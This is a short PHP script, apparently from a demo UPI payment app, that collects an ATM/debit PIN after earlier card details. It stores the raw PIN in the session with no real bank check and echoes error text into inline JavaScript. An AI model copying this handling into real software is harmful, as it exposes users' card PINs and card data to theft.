 <?php
session_start();
require_once 'connect.php';

// Get user details from session
$country_code = $_SESSION['country_code'] ?? '';
$phone_number = $_SESSION['phone_number'] ?? '';

// Verify user is logged in
if (empty($country_code) || empty($phone_number)) {
    echo "<script>alert('Please log in to access this page.'); window.location.href = 'login.html';</script>";
    exit;
}

// Get form data
$atm_pin = $_POST['atm_pin'] ?? '';

// Get bank details from session (saved by save_bank_session.php)
$bank_name = $_SESSION['bank_name'] ?? '';
$last_6_digits = $_SESSION['last_6_digits'] ?? '';
$expiry_date = $_SESSION['expiry_date'] ?? '';

// Validation
if (empty($atm_pin)) {
    echo "<script>alert('Please enter your ATM/Debit PIN.'); window.history.back();</script>";
    exit;
}

// Validate PIN format (4 digits)
if (!preg_match('/^\d{4}$/', $atm_pin)) {
    echo "<script>alert('PIN must be 4 digits.'); window.history.back();</script>";
    exit;
}

// Validate bank details exist
if (empty($bank_name) || empty($last_6_digits) || empty($expiry_date)) {
    echo "<script>alert('Bank details missing. Please start from bank selection.'); window.location.href = 'select_bank.html';</script>";
    exit;
}

// Save bank details to database - MOVED TO set_upi_pin.php
// We don't save to linked_banks anymore, and we don't clear session yet.
// The session data is needed for the next step (set_upi_pin.php)

try {
    // Store the card PIN in session for set_upi_pin.php to use
    $_SESSION['card_pin'] = $atm_pin;
    
    // Just verify the PIN is correct format (already done above)
    // In a real app, we would verify against the bank API here.
    
    // Redirect to UPI PIN setup
    echo "<script>
        window.location.href = 'set_upi_pin.html';
    </script>";
    
} catch (Exception $e) {
    echo "<script>alert('Error: " . addslashes($e->getMessage()) . "'); window.history.back();</script>";
    exit;
}
?>
